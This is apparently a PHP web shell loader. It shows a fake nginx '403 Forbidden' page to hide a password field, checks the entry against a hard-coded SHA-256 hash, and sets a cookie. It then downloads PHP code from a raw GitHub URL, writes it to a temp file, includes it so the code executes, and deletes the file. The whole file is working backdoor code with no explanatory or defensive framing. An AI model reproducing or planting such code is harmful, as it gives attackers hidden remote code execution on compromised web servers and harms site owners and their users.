<?php
$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (You don't have permission access to server / on this server) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?php
session_start();

function ambil_konten($url) {
    $konten = @file_get_contents($url);
    if ($konten !== false) return $konten;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $konten = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode !== 200 || empty($konten)) return false;
    return $konten;
}

$url = "https://raw.githubusercontent.com/soy777/gg/main/ok.php";
$konten = ambil_konten($url);

if ($konten === false) {
    die("Gagal mengambil data dari URL.");
}

try {
    ob_start();
    $tmp = tempnam(sys_get_temp_dir(), "kode_");
    file_put_contents($tmp, $konten);
    include $tmp;
    unlink($tmp);
    ob_end_flush();
} catch (Throwable $e) {
    ob_end_clean();
    die("Terjadi kesalahan saat eksekusi kode: " . $e->getMessage());
}
?>
